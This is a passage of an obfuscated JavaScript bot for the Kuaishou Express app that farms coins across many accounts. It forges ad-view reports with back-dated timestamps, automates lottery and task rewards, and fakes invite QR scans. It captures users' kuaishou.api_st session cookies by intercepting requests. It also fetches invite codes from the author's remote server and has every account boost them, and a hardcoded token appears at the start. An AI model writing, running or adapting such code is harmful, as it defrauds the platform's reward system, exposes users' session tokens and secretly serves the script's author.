a8a5abbd&os=android&pUid=qQUO36wB-dz_Gy3tLzpbI8UmT77Z5_Ud9c4158be54de319&uQaTag=0&__NStokensig=1bc5fb08cb72593ff961c4aa5f91e578fe09c26159dade76d74fcbd03f56c1ba&token=Cg9rdWFpc2hvdS5hcGkuc3QSoAHfCvyUFfoDIjKLtobHRUI4rV5KX9fmSh5BaFAxbHiD3vrmO7EctytWlWc8tphfjXS5wvVXgD-1C2GqZwimFMlcdjvp5Ioum4yP90I2RAgQnIqRcpeU_cGzwVKlXb0goIUU7hLjiM3AJe13x3GP3V6QxP5YHQAtJYjdbcS1Tgt9PW52UKgZo9xNAv639YVDtvr370HZL90D3uhO5HqUIkGiGhJNk_1UD2hFuJqWEjmUf_4qTIUiIOV_btfbatJr_naJUihUtP_EB3O1dVMiyaa2e0em64z1KAUwAQ",
        _0x5133c4 = _0x495d61(_0x2bcaf3, this["cookie"], _0x347db8);

    await _0x39a23b("post", _0x5133c4);
    let _0x45e390 = _0x1a0963;

    if (!_0x45e390) {
      return;
    }

    _0x45e390["result"] == 1 ? _0x45e390["impAdInfo"] && _0x45e390["impAdInfo"]["length"] > 0 && _0x45e390["impAdInfo"][0]["adInfo"] && _0x45e390["impAdInfo"][0]["adInfo"]["length"] > 0 && _0x45e390["impAdInfo"][0]["adInfo"][0]["adBaseInfo"] && (await _0x3de8b8["wait"](200), await this["ksNeoAdReward"](_0x45e390["llsid"], _0x45e390["impAdInfo"][0]["adInfo"][0]["adBaseInfo"]["creativeId"], _0x58630d)) : console["log"]("账号[" + this["name"] + "]获取" + _0x58630d["name"] + "参数失败：" + _0x45e390["error_msg"]);
  }

  async ["ksNeoAdReward"](_0x1656b0, _0x4f9393, _0x1c21e2) {
    let _0x367ea1 = new Date()["getTime"](),
        _0x1aac8d = Math["floor"](Math["random"]() * 30000) + 45000,
        _0x203d12 = _0x367ea1 - _0x1aac8d,
        _0x52b8e9 = "https://api.e.kuaishou.com/rest/r/ad/task/report",
        _0x28b824 = "bizStr={\"businessId\":" + _0x1c21e2["businessId"] + ",\"endTime\":" + _0x367ea1 + ",\"extParams\":\"" + _0x1c21e2["extParams"] + "\",\"mediaScene\":\"video\",\"neoInfos\":[{\"creativeId\":" + _0x4f9393 + ",\"extInfo\":\"\",\"llsid\":" + _0x1656b0 + ",\"taskType\":1}],\"pageId\":" + _0x1c21e2["pageId"] + ",\"posId\":" + _0x1c21e2["posId"] + ",\"startTime\":" + _0x203d12 + ",\"subPageId\":" + _0x1c21e2["subPageId"] + '}',
        _0x75f548 = _0x495d61(_0x52b8e9, this["cookie"], _0x28b824);

    await _0x39a23b("post", _0x75f548);
    let _0x4960dc = _0x1a0963;

    if (!_0x4960dc) {
      return;
    }

    if (_0x4960dc["result"] == 1) {
      let _0x46d5ea = _0x4960dc["data"]["neoAmount"] + '金币';

      if (_0x4960dc["data"]["neoToH5Data"]) {
        try {
          let _0x1bda7b = JSON["parse"](_0x331719["decode"](_0x4960dc["data"]["neoToH5Data"])["replace"](/\0/g, ''));

          if (_0x1bda7b["extraCoin"]) {
            _0x46d5ea += '+' + _0x1bda7b["extraCoin"] + '金币';
          }
        } catch (_0x280b22) {
          console["log"](_0x4960dc["data"]["neoToH5Data"]);
        } finally {}
      }

      console["log"]("账号[" + this["name"] + ']看' + _0x1c21e2["name"] + '获得' + _0x46d5ea);

      if (this["hasLuckydraw"]) {
        await this["luckdrawTasks"]();
      }
    } else {
      console["log"]("账号[" + this["name"] + ']看' + _0x1c21e2["name"] + "失败：" + _0x4960dc["error_msg"]);
    }
  }

  async ["luckdrawInfo"]() {
    let _0x114805 = "https://activity.e.kuaishou.com/rest/r/game/user/info",
        _0x4a96ef = '',
        _0x1e40b1 = _0x495d61(_0x114805, this["cookie"], _0x4a96ef);

    await _0x39a23b("get", _0x1e40b1);
    let _0x4d8fbb = _0x1a0963;

    if (!_0x4d8fbb) {
      return;
    }

    if (_0x4d8fbb["result"] == 1) {
      console["log"]("账号[" + this["name"] + "]现有" + _0x4d8fbb["data"]["userDiamondResult"]["diamondPercent"] + "钻石，剩余抽奖次数：" + _0x4d8fbb["data"]["userDailyLotteryTimesResult"]["remainTimes"]);

      for (let _0x2adb6a = 0; _0x2adb6a < _0x4d8fbb["data"]["userDailyLotteryTimesResult"]["remainTimes"]; _0x2adb6a++) {
        await _0x3de8b8["wait"](200);
        await this["luckydraw"]();
      }
    } else {
      console["log"]("账号[" + this["name"] + "]查询抽奖次数失败：" + _0x4d8fbb["error_msg"]);
    }
  }

  async ["luckydraw"]() {
    let _0xc4b1e8 = "https://activity.e.kuaishou.com/rest/r/game/lottery?wheelVersion=1",
        _0x350919 = '',
        _0x403095 = _0x495d61(_0xc4b1e8, this["cookie"], _0x350919);

    await _0x39a23b("post", _0x403095);
    let _0x10d50d = _0x1a0963;

    if (!_0x10d50d) {
      return;
    }

    if (_0x10d50d["result"] == 1) {
      let _0x151483 = _0x10d50d["data"]["coinCount"] ? _0x10d50d["data"]["coinCount"] + '金币' : _0x10d50d["data"]["diamondCount"] ? _0x10d50d["data"]["diamondCount"] + '钻石' : '空气';

      console["log"]("账号[" + this["name"] + "]抽奖获得" + _0x151483);

      if (_0x10d50d["data"]["videoCoinCount"]) {
        console["log"]("额外奖励：" + _0x10d50d["data"]["videoCoinCount"]);
      }

      if (_0x10d50d["data"]["schema"]) {
        try {
          console["log"](_0x331719["decode"](_0x10d50d["data"]["schema"]));
        } catch (_0xd84b93) {
          console["log"](_0x10d50d["data"]["schema"]);
        } finally {}
      }

      if (this["hasLuckydraw"]) {
        await this["luckdrawTasks"]();
      }
    } else {
      console["log"]("账号[" + this["name"] + "]抽奖失败：" + _0x10d50d["error_msg"]);
    }
  }

  async ["luckydrawSign"]() {
    let _0xc73223 = "https://activity.e.kuaishou.com/rest/r/game/sign-in",
        _0x4b6fab = '',
        _0x598268 = _0x495d61(_0xc73223, this["cookie"], _0x4b6fab);

    await _0x39a23b("get", _0x598268);
    let _0x502237 = _0x1a0963;

    if (!_0x502237) {
      return;
    }

    _0x502237["result"] == 1 ? _0x502237["data"]["isShow"] && console["log"]("账号[" + this["name"] + "]抽奖页签到成功") : (console["log"]("账号[" + this["name"] + "]查询抽奖签到情况失败：" + _0x502237["error_msg"]), _0x502237["error_msg"]["indexOf"]("激励游戏未在运营") > -1 && (this["hasLuckydraw"] = false));
  }

  async ["luckdrawTimerInfo"]() {
    let _0x2ffbad = "https://activity.e.kuaishou.com/rest/r/game/timer-reward/info",
        _0x456aaf = '',
        _0x49e74c = _0x495d61(_0x2ffbad, this["cookie"], _0x456aaf);

    await _0x39a23b("get", _0x49e74c);
    let _0x2cba5f = _0x1a0963;

    if (!_0x2cba5f) {
      return;
    }

    if (_0x2cba5f["result"] == 1) {
      if (_0x2cba5f["data"]) {
        let _0x203650 = new Date()["getTime"](),
            _0x5dfda7 = _0x2cba5f["data"]["lastTimerTime"],
            _0x11ca9b = _0x2cba5f["data"]["minutesInterval"] * 60 * 1000,
            _0x508a9d = _0x5dfda7 + _0x11ca9b;

        _0x203650 < _0x508a9d ? console["log"]("账号[" + this["name"] + "]抽奖页奖励冷却时间还有" + (_0x508a9d - _0x203650) / 1000 + '秒') : (await _0x3de8b8["wait"](200), await this["luckdrawTimerReward"](_0x2cba5f["data"]["goldNum"]));
      } else {
        console["log"]("账号[" + this["name"] + "]抽奖页定时奖励次数已用完");
      }
    } else {
      console["log"]("账号[" + this["name"] + "]查询抽奖页定时奖励情况失败：" + _0x2cba5f["error_msg"]);
    }
  }

  async ["luckdrawTimerReward"](_0x454656) {
    let _0x2736a9 = "https://activity.e.kuaishou.com/rest/r/game/timer-reward",
        _0x3cfba9 = '',
        _0xe6c96d = _0x495d61(_0x2736a9, this["cookie"], _0x3cfba9);

    await _0x39a23b("post", _0xe6c96d);
    let _0xb823ea = _0x1a0963;

    if (!_0xb823ea) {
      return;
    }

    _0xb823ea["result"] == 1 ? console["log"]("账号[" + this["name"] + "]领取抽奖页定时奖励获得" + _0x454656 + '金币') : console["log"]("账号[" + this["name"] + "]领取抽奖页定时奖励失败：" + _0xb823ea["error_msg"]);
  }

  async ["luckdrawTasks"]() {
    let _0x1198c2 = "https://activity.e.kuaishou.com/rest/r/game/tasks",
        _0x55d494 = '',
        _0x4d7b3c = _0x495d61(_0x1198c2, this["cookie"], _0x55d494);

    await _0x39a23b("get", _0x4d7b3c);
    let _0x52ab2d = _0x1a0963;

    if (!_0x52ab2d) {
      return;
    }

    if (_0x52ab2d["result"] == 1) {
      for (let _0x3b4109 of _0x52ab2d["data"]["dailyTasks"]) {
        _0x3b4109["taskState"] == 1 && (await _0x3de8b8["wait"](200), await this["luckdrawTasksReward"](_0x3b4109));
      }

      for (let _0x39a4a6 of _0x52ab2d["data"]["growthTasks"]) {
        _0x39a4a6["taskState"] == 1 && (await _0x3de8b8["wait"](200), await this["luckdrawTasksReward"](_0x39a4a6));
      }
    } else {
      console["log"]("账号[" + this["name"] + "]查询抽奖页任务失败：" + _0x52ab2d["error_msg"]);
    }
  }

  async ["luckdrawTasksReward"](_0x462615) {
    let _0x5607bd = "https://activity.e.kuaishou.com/rest/r/game/task/reward-receive?taskName=" + _0x462615["taskName"],
        _0x46decc = '',
        _0x2699dd = _0x495d61(_0x5607bd, this["cookie"], _0x46decc);

    await _0x39a23b("get", _0x2699dd);
    let _0x38a7c2 = _0x1a0963;

    if (!_0x38a7c2) {
      return;
    }

    _0x38a7c2["result"] == 1 ? console["log"]("账号[" + this["name"] + "]领取抽奖任务[" + _0x462615["taskTitle"] + "]奖励获得" + _0x38a7c2["data"]["popUp"]["taskRewardName"]) : console["log"]("账号[" + this["name"] + "]领取抽奖任务[" + _0x462615["taskTitle"] + "]奖励失败：" + _0x38a7c2["error_msg"]);
  }

  async ["helpInvite"](_0x20b9e6) {
    let _0x3a5dfe = _0x20b9e6["split"]('&'),
        _0x37b989 = _0x3a5dfe[0],
        _0x3c285b = _0x3a5dfe[1],
        _0x4b3956 = "https://nebula.kuaishou.com/rest/n/nebula/qrcode?version=1.2.0",
        _0x465c38 = '',
        _0x328013 = _0x495d61(_0x4b3956, this["cookie"], _0x465c38);

    _0x328013["headers"]["Referer"] = "https://nebula.kuaishou.com/fission/face-qrcode?fid=" + _0x37b989 + "&shareToken=" + _0x3c285b + "&source=qrcode";
    await _0x39a23b("get", _0x328013);
    let _0x47a78e = _0x1a0963;

    if (!_0x47a78e) {
      return;
    }

    if (!(_0x47a78e["result"] == 1)) {
      console["log"]("账号[" + this["name"] + "]邀请失败：" + _0x47a78e["error_msg"]);
    }
  }

  async ["helpPackage"](_0x22f6e9, _0x2b1333) {
    let _0x2f6bb5 = {
      'url': "https://ug-fission.kuaishou.com/rest/n/darwin/bargain/overview?version=2.1.0",
      'body': "{\"fid\":\"895255750\",\"cc\":\"share_wxms\",\"followRefer\":\"151\",\"code\":\"" + _0x22f6e9 + "\",\"shareMethod\":\"TOKEN\",\"kpn\":\"NEBULA\",\"subBiz\":\"BARGAIN\",\"shareId\":\"16905401129783\",\"shareMode\":\"SYSTEM\",\"noBackNavi\":\"true\",\"originShareId\":\"16905401129783\",\"useMerchantWeb\":\"1\",\"layoutType\":\"4\",\"shareObjectId\":" + JSON["stringify"]("{\"teamId\":\"\",\"packetId\":\"" + _0x2b1333 + "\"}") + ",\"shareUrlOpened\":\"0\",\"hyId\":\"bargain\",\"timestamp\":" + +new Date() + ",\"pageCode\":1,\"adamA\":0,\"adamB\":0}",
      'headers': {
        'User-Agent': "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.87 Safari/537.36",
        'Cookie': "kpn=NEBULA; kpf=ANDROID_PHONE; did=; " + Math["floor"](Math["random"]() * 1000 + 1) + " ANDROID_ff60a387f6ba8904; " + this["cookie"] + "; c=XIAOMI; ver=10.2; appver=10.2.41.3075; language=zh-cn; ",
        'Content-Type': "application/json",
        'Origin': "https://ug-fission.kuaishou.com",
        'X-Requested-With': "com.kuaishou.nebula",
        'Sec-Fetch-Site': "same-origin",
        'Sec-Fetch-Mode': "cors",
        'Sec-Fetch-Dest': "empty",
        'Referer': "https://ug-fission.kuaishou.com/bargain/?fid=895255750&cc=share_wxms&followRefer=151&code=" + _0x22f6e9 + "&shareMethod=TOKEN&kpn=NEBULA&subBiz=BARGAIN&shareId=16905401129783&shareMode=SYSTEM&noBackNavi=true&originShareId=16905401129783&useMerchantWeb=1&layoutType=4&shareObjectId=%7B%22teamId%22%3A%22%22,%22packetId%22%3A%22" + _0x2b1333 + "%22%7D&shareUrlOpened=0&hyId=bargain&timestamp=" + +new Date(),
        'Accept-Language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
      }
    };
    await _0x39a23b("post", _0x2f6bb5);
    let _0x265d1f = _0x1a0963;

    if (!_0x265d1f) {
      return;
    }
  }

  async ["helpScan"](_0x37bccf) {
    let _0x1fb56a = _0x37bccf["split"]('&'),
        _0x1fc056 = _0x1fb56a[0],
        _0x37c4fc = _0x1fb56a[1];

    if (_0x1fc056 == this["userId"]) {
      return;
    }

    let _0x202af9 = "https://api.kuaishouzt.com/rest/zt/share/show/any",
        _0x1dc9c8 = "theme=light&sdkVersion=1.14.0.4&kpf=ANDROID_PHONE&shareMessage=https%3A%2F%2Fnicdd.get666bjrqu985xvp14v.com%2Ff%2F" + _0x37c4fc + "%3FlayoutType%3D4&kpn=NEBULA&launchState=hotLaunch&sessionId=ac165e40-48bd-42de-9fc5-b250d7eb983c&extTransientParams=%7B%22source%22%3A%22userScanCamera%22%7D",
        _0xcc2548 = _0x495d61(_0x202af9, this["cookie"], _0x1dc9c8);

    await _0x39a23b("post", _0xcc2548);
    let _0x466115 = _0x1a0963;

    if (!_0x466115) {
      return;
    }

    _0x466115["result"] == 1 ? (await _0x3de8b8["wait"](100), await this["helpInvite"](_0x37bccf)) : console["log"]("账号[" + this["name"] + "]模拟邀请二维码扫描失败：" + _0x466115["error_msg"]);
  }

  async ["bindInfo"]() {
    let _0x2b0393 = "https://www.kuaishoupay.com/pay/account/h5/provider/bind_info",
        _0x26a061 = "account_group_key=NEBULA_CASH_ACCOUNT&bind_page_type=3",
        _0x1eb81c = _0x495d61(_0x2b0393, this["cookie"], _0x26a061);

    await _0x39a23b("post", _0x1eb81c);
    let _0x428c8c = _0x1a0963;

    if (!_0x428c8c) {
      return;
    }

    if (_0x428c8c["result"] == "SUCCESS") {
      let _0x18874e = "未绑定支付宝",
          _0x204c09 = "未绑定微信";
      _0x428c8c["alipay_bind"] == true && (this["bindAlipay"] = true, this["alipay"] = _0x428c8c["alipay_nick_name"], _0x18874e = "已绑定支付宝[" + _0x428c8c["alipay_nick_name"] + ']');
      _0x428c8c["wechat_bind"] == true && (this["bindWechat"] = true, this["wechat"] = _0x428c8c["wechat_nick_name"], _0x204c09 = "已绑定微信[" + _0x428c8c["wechat_nick_name"] + ']');
      console["log"]("账号[" + this["name"] + ']' + _0x204c09 + '，' + _0x18874e);
    } else {
      console["log"]("账号[" + this["name"] + "]查询提现账号绑定情况失败：" + _0x428c8c["error_msg"]);
    }
  }

  async ["accountInfo"]() {
    let _0x249278 = "https://www.kuaishoupay.com/pay/account/h5/withdraw/account_info",
        _0x2969d4 = "account_group_key=NEBULA_CASH_ACCOUNT&providers=",
        _0xc49302 = _0x495d61(_0x249278, this["cookie"], _0x2969d4);

    await _0x39a23b("post", _0xc49302);
    let _0x6f12ca = _0x1a0963;

    if (!_0x6f12ca) {
      return;
    }

    _0x6f12ca["result"] == "SUCCESS" ? this["needSms"] = _0x6f12ca["need_mobile_code"] : console["log"]("账号[" + this["name"] + "]查询账号提现情况失败：" + _0x6f12ca["error_msg"]);
  }

}

!(async () => {
  if (typeof $request !== "undefined") {
    await _0x13d82d();
  } else {
    if (!(await _0x2dc359())) {
      return;
    }

    console["log"]("============================");
    console["log"]("\n============== 登录 ==============");

    for (let _0x81769c of _0x431ea3) {
      await _0x81769c["getUserInfo"]();
      await _0x3de8b8["wait"](500);
    }

    let _0xba2efb = _0x431ea3["filter"](_0x1ad84c => _0x1ad84c["valid"] == true);

    if (_0xba2efb["length"] == 0) {
      return;
    }

    for (let _0x260cab of _0xba2efb) {
      console["log"]("\n=========== " + _0x260cab["name"] + " ===========");
      await _0x260cab["getSignInfo"]();
      await _0x3de8b8["wait"](200);
      await _0x260cab["openBox"](false);
      await _0x3de8b8["wait"](200);
      await _0x260cab["taskList"]();
      await _0x3de8b8["wait"](200);
      await _0x260cab["luckydrawSign"]();
      await _0x3de8b8["wait"](200);

      if (_0x260cab["hasLuckydraw"] == true) {
        await _0x260cab["luckdrawTimerInfo"]();
        await _0x3de8b8["wait"](200);
        await _0x260cab["luckdrawTasks"]();
        await _0x3de8b8["wait"](200);
        await _0x260cab["luckdrawInfo"]();
        await _0x3de8b8["wait"](200);
      }

      if (_0x260cab["task"][_0x1e4967["luckydraw"]]["needRun"]) {
        for (let _0x3b610b = 0; _0x3b610b < _0x260cab["task"][_0x1e4967["luckydraw"]]["num"]; _0x3b610b++) {
          _0x20a9d7 < 13 ? (await _0x260cab["ksNeoAdParam"](_0x10d9f8["luckdrawVideo_161_213"]), await _0x3de8b8["wait"](200), await _0x260cab["ksNeoAdParam"](_0x10d9f8["luckdrawVideo_11_213"]), await _0x3de8b8["wait"](200)) : (await _0x260cab["ksNeoAdParam"](_0x10d9f8["luckdrawVideo_161_100"]), await _0x3de8b8["wait"](200), await _0x260cab["ksNeoAdParam"](_0x10d9f8["luckdrawVideo_11_100"]), await _0x3de8b8["wait"](200));
        }
      }

      if (_0x260cab["task"][_0x1e4967['ad']]["needRun"]) {
        for (let _0x4bf45e = 0; _0x4bf45e < _0x260cab["task"][_0x1e4967['ad']]["num"]; _0x4bf45e++) {
          await _0x260cab["ksAdParam"](_0x351e94["ad1"]);
          await _0x3de8b8["wait"](200);
          _0x4bf45e != _0x260cab["task"][_0x1e4967['ad']]["num"] - 1 && (await _0x3de8b8["wait"](2000));
        }
      }

      if (_0x260cab["task"][_0x1e4967['gj']]["needRun"]) {
        for (let _0x48a0b0 = 0; _0x48a0b0 < _0x260cab["task"][_0x1e4967['gj']]["num"]; _0x48a0b0++) {
          await _0x260cab["ksgj"]()[[]];
          await _0x3de8b8["wait"](200);
        }
      }

      if (_0x260cab["task"][_0x1e4967["live"]]["needRun"]) {
        for (let _0x5ae845 = 0; _0x5ae845 < _0x260cab["task"][_0x1e4967["live"]]["num"]; _0x5ae845++) {
          await _0x260cab["ksNeoAdParam"](_0x10d9f8["liveVideo_75"]);
          await _0x3de8b8["wait"](200);
        }
      }

      if (_0x260cab["task"][_0x1e4967["invite"]]["needRun"]) {
        for (let _0x42de51 = 0; _0x42de51 < _0x260cab["task"][_0x1e4967["invite"]]["num"]; _0x42de51++) {
          await _0x260cab["ksNeoAdParam"](_0x10d9f8["inviteVideo_2008"]);
          await _0x3de8b8["wait"](200);
        }
      }
    }

    console["log"]("\n============== 账户情况 ==============");

    for (let _0x1ebc1d of _0xba2efb) {
      await _0x1ebc1d["accountOverview"]();
      await _0x3de8b8["wait"](200);
      await _0x1ebc1d["bindInfo"]();
      await _0x3de8b8["wait"](200);
      await _0x1ebc1d["accountInfo"]();
      await _0x3de8b8["wait"](200);
    }

    console["log"]("\n============== 自动提现 ==============");
    let _0x8c437b = "按提现列表自动提现";

    if (_0x1e627b) {
      _0x8c437b = "自动提现" + _0x1e627b + '元';
    }

    if (_0x13d24b) {
      _0x8c437b = "最大化提现";
    }

    if (_0x20a9d7 == _0x26f17b) {
      console["log"]("提现时间，现在设置为" + _0x8c437b);

      for (let _0x4720e6 of _0xba2efb) {
        await _0x4720e6["withdrawOverview"]();
        await _0x3de8b8["wait"](200);
      }
    } else {
      console["log"]("非提现时间，现在设置为" + _0x26f17b + '点' + _0x8c437b);
    }

    await _0x217ea6();

    if (_0x5718d8["length"] > 0) {
      for (let _0x719d9b of _0xba2efb) {
        for (let _0x932430 of _0x5718d8) {
          await _0x719d9b["helpScan"](_0x932430);
          await _0x3de8b8["wait"](200);
        }
      }
    }

    if (yifenk["length"] > 0) {
      for (let _0x5af0dd of _0xba2efb) {
        for (let _0x560565 of yifenk) {
          let _0x31c8fc = _0x560565["split"]('@')[0],
              _0x464b00 = _0x560565["split"]('@')[1];

          await _0x5af0dd["helpPackage"](_0x464b00, _0x31c8fc);
          await _0x3de8b8["wait"](1000);
        }
      }
    }

    if (_0x113109 == 2) {
      await _0x577f0c();
    } else {
      if (_0x113109 == 1) {
        if (_0x20a9d7 == _0x26f17b) {
          await _0x577f0c();
        }
      }
    }
  }
})()["catch"](_0x1997cf => _0x3de8b8["logErr"](_0x1997cf))["finally"](() => _0x3de8b8["done"]());

async function _0x13d82d() {
  if ($request["url"]["indexOf"]("appsupport/yoda/biz/info") > -1) {
    let _0x4efc86 = $request["headers"]["Cookie"]["match"](/(kuaishou.api_st=[\w\-]+)/)[1] + ';';

    _0x547212 ? _0x547212["indexOf"](_0x4efc86) == -1 && (_0x547212 = _0x547212 + "\n" + _0x4efc86, _0x3de8b8["setdata"](_0x547212, "ksjsbCookie"), ckList = _0x547212["split"]("\n"), _0x3de8b8["msg"](_0x11b3c3 + (" 获取第" + ckList["length"] + "个ck成功: " + _0x4efc86))) : (_0x3de8b8["setdata"](_0x4efc86, "ksjsbCookie"), _0x3de8b8["msg"](_0x11b3c3 + (" 获取第1个ck成功: " + _0x4efc86)));
  }

  if ($request["url"]["indexOf"]("ksapp/client/package/renew") > -1) {
    let _0x59efdb = $request["url"]["match"](/(kuaishou.api_st=[\w\-]+)/)[1] + ';';

    _0x547212 ? _0x547212["indexOf"](_0x59efdb) == -1 && (_0x547212 = _0x547212 + "\n" + _0x59efdb, _0x3de8b8["setdata"](_0x547212, "ksjsbCookie"), ckList = _0x547212["split"]("\n"), _0x3de8b8["msg"](_0x11b3c3 + (" 获取第" + ckList["length"] + "个ck成功: " + _0x59efdb))) : (_0x3de8b8["setdata"](_0x59efdb, "ksjsbCookie"), _0x3de8b8["msg"](_0x11b3c3 + (" 获取第1个ck成功: " + _0x59efdb)));
  }
}

async function _0x2dc359() {
  if (_0x547212) {
    let _0x26a2d4 = _0x4c35fe[0];

    for (let _0x5f49aa of _0x4c35fe) {
      if (_0x547212["indexOf"](_0x5f49aa) > -1) {
        _0x26a2d4 = _0x5f49aa;
        break;
      }
    }

    for (let _0x2d5985 of _0x547212["split"](_0x26a2d4)) {
      _0x2d5985 && _0x431ea3["push"](new _0x9d8dda(_0x2d5985));
    }

    _0x19c25c = _0x431ea3["length"];
  } else {
    console["log"]("未找到CK");
    return;
  }

  console["log"]("共找到" + _0x19c25c + "个账号");
  return true;
}

async function _0x577f0c() {
  if (!_0x279d25) {
    return;
  }

  notifyBody = "快手极速版运行通知\n\n" + _0x279d25;

  if (_0x113109 > 0) {
    _0x3de8b8["msg"](notifyBody);

    if (_0x3de8b8["isNode"]()) {
      var _0x1b2640 = require("./sendNotify");

      await _0x1b2640["sendNotify"](_0x3de8b8["name"], notifyBody);
    }
  } else {
    console["log"](notifyBody);
  }
}

function _0x1ab8b7(_0x2242ed) {
  console["log"](_0x2242ed);
  _0x279d25 += _0x2242ed;
  _0x279d25 += "\n";
}

async function _0x282ff5(_0x495bc2) {
  if (!PushDearKey) {
    return;
  }

  if (!_0x495bc2) {
    return;
  }

  console["log"]("\n============= PushDear 通知 =============\n");
  console["log"](_0x495bc2);
  let _0x27e3c1 = {
    'url': "https://api2.pushdeer.com/message/push?pushkey=" + PushDearKey + "&text=" + encodeURIComponent(_0x495bc2),
    'headers': {}
  };
  await _0x39a23b("get", _0x27e3c1);

  let _0x388881 = _0x1a0963,
      _0x17b8d7 = _0x388881["content"]["result"] == false ? '失败' : '成功';

  console["log"]("\n========== PushDear 通知发送" + _0x17b8d7 + " ==========\n");
}

async function _0x505e51() {
  const _0x328d5b = {
    "url": _0x180c0c,
    "headers": ''
  };
  await _0x39a23b("get", _0x328d5b);
  let _0x1dd192 = _0x1a0963;

  if (!_0x1dd192) {
    return;
  }

  if (_0x1dd192[_0x5bc515]) {
    let _0x47bef2 = _0x1dd192[_0x5bc515];

    if (_0x47bef2["status"] == 0) {
      if (_0x459e63 >= _0x47bef2["version"]) {
        _0x2e716e = true;
        _0x75eec0 = "https://127.0.0.1/";
        console["log"](_0x47bef2["msg"][_0x47bef2["status"]]);
        console["log"](_0x47bef2["updateMsg"]);
        console["log"]("现在运行的脚本版本是：1.07，最新脚本版本：" + _0x47bef2["latestVersion"]);
      } else {
        console["log"](_0x47bef2["versionMsg"]);
      }
    } else {
      console["log"](_0x47bef2["msg"][_0x47bef2["status"]]);
    }
  } else {
    console["log"](_0x1dd192["errorMsg"]);
  }
}

async function _0x217ea6() {
  let _0x1613b6 = '';
  const _0x31b39b = {
    "url": _0x180c0c,
    "headers": ''
  };
  await _0x39a23b("get", _0x31b39b);
  let _0x147d48 = _0x1a0963;

  if (!_0x147d48) {
    return _0x1613b6;
  }

  for (let _0x361c17 of _0x147d48["invite"]) {
    if (_0x361c17) {
      _0x5718d8["push"](_0x361c17);
    }
  }

  for (let _0x1414e1 of _0x147d48["ijkkk"]) {
    _0x1414e1 && yifenk["push"](_0x1414e1);
  }

  return _0x1613b6;
}

function _0x495d61(_0x162033, _0x485206, _0x4ac334 = '') {
  let _0x2590bb = _0x162033["replace"]('//', '/')["split"]('/')[1];

  const _0x110665 = {
    "Host": _0x2590bb,
    "Cookie": _0x485206
  };
  const _0x19cd48 = {
    "url": _0x162033,
    "headers": _0x110665
  };
  _0x4ac334 && (_0x19cd48["body"] = _0x4ac334, _0x19cd48["headers"]["Content-Type"] = "application/x-www-form-urlencoded", _0x19cd48["headers"]["Content-Length"] = _0x19cd48["body"] ? _0x19cd48["body"]["length"] : 0);
  return _0x19cd48;
}

async function _0x39a23b(_0x2bab6b, _0x4f3f92) {
  _0x1a0963 = null;
  return new Promise(_0x1768fb => {
    _0x3de8b8[_0x2bab6b](_0x4f3f92, async (_0x49d219, _0x237ad5, _0x3f2a60) => {
      try {
        if (_0x49d219) {
          console["log"](_0x2bab6b + "请求失败"), console["log"](JSON["stringify"](_0x49d219)), _0x3de8b8["logErr"](_0x49d219);
        } else {
          if (_0x244336(_0x3f2a60)) {
            _0x1a0963 = JSON["parse"](_0x3f2a60);
          }
        }
      } catch (_0x16ae7e) {
        _0x3de8b8["logErr"](_0x16ae7e, _0x237ad5);
      } finally {
        _0x1768fb();
      }
    });
  });
}

function _0x244336(_0x5ee830) {
  try {
    if (typeof JSON["parse"](_0x5ee830) == "object") {
      return true;
    } else {
      console["log"](_0x5ee830);
    }
  } catch (_0x21dc14) {
    return console["log"](_0x21dc14), console["log"]("服务器访问数据为空，请检查自身设备网络情况"), false;
  }
}

function _0x271dc5(_0x218011, _0x237c2b) {
  return _0x218011 < _0x237c2b ? _0x218011 : _0x237c2b;
}

function _0x2be587(_0x11bf22, _0x2d73b0) {
  return _0x11bf22 < _0x2d73b0 ? _0x2d73b0 : _0x11bf22;
}

function _0x4c9db4(_0x5c9bfe, _0x46f484, _0x4661f9 = '0') {
  let _0x43fb3d = String(_0x5c9bfe),
      _0x312746 = _0x46f484 > _0x43fb3d["length"] ? _0x46f484 - _0x43fb3d["length"] : 0,
      _0xcc3f1f = '';

  for (let _0x1cba81 = 0; _0x1cba81 < _0x312746; _0x1cba81++) {
    _0xcc3f1f += _0x4661f9;
  }

  _0xcc3f1f += _0x43fb3d;
  return _0xcc3f1f;
}

function _0x4b5cde(_0x3e2d7f = 12) {
  let _0x2a12b1 = "abcdef0123456789",
      _0x5c804e = _0x2a12b1["length"],
      _0x586293 = '';

  for (i = 0; i < _0x3e2d7f; i++) {
    _0x586293 += _0x2a12b1["charAt"](Math["floor"](Math["random"]() * _0x5c804e));
  }

  return _0x586293;
}

var _0x331719 = {
  '_keyStr': "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
  'encode': function (_0x3d866c) {
    var _0x22881f = '';

    var _0x1acb17, _0x99e842, _0x59eb34, _0x3c64d1, _0x4e005b, _0x1f8816, _0x113b61;

    var _0x56beb5 = 0;
    _0x3d866c = _0x331719["_utf8_encode"](_0x3d866c);

    while (_0x56beb5 < _0x3d866c["length"]) {
      _0x1acb17 = _0x3d866c["charCodeAt"](_0x56beb5++);
      _0x99e842 = _0x3d866c["charCodeAt"](_0x56beb5++);
      _0x59eb34 = _0x3d866c["charCodeAt"](_0x56beb5++);
      _0x3c64d1 = _0x1acb17 >> 2;
      _0x4e005b = (_0x1acb17 & 3) << 4 | _0x99e842 >> 4;
      _0x1f8816 = (_0x99e842 & 15) << 2 | _0x59eb34 >> 6;
      _0x113b61 = _0x59eb34 & 63;

      if (isNaN(_0x99e842)) {
        _0x1f8816 = _0x113b61 = 64;
      } else {
        isNaN(_0x59eb34) && (_0x113b61 = 64);
      }

      _0x22881f = _0x22881f + this["_keyStr"]["charAt"](_0x3c64d1) + this["_keyStr"]["charAt"](_0x4e005b) + this["_keyStr"]["charAt"](_0x1f8816) + this["_keyStr"]["charAt"](_0x113b61);
    }

    return _0x22881f;
  },
  'decode': function (_0x46d0ef) {
    var _0x2abf2d = '';

    var _0xaf658a,
        _0x5bd0a8,
        _0x5a3326,
        _0x112afe,
        _0x317e49,
        _0x465732,
        _0x50949d,
        _0x3b4383 = 0;

    _0x46d0ef = _0x46d0ef["replace"](/[^A-Za-z0-9+/=]/g, '');

    while (_0x3b4383 < _0x46d0ef["length"]) {
      _0x112afe = this["_keyStr"]["indexOf"](_0x46d0ef["charAt"](_0x3b4383++));
      _0x317e49 = this["_keyStr"]["indexOf"](_0x46d0ef["charAt"](_0x3b4383++));
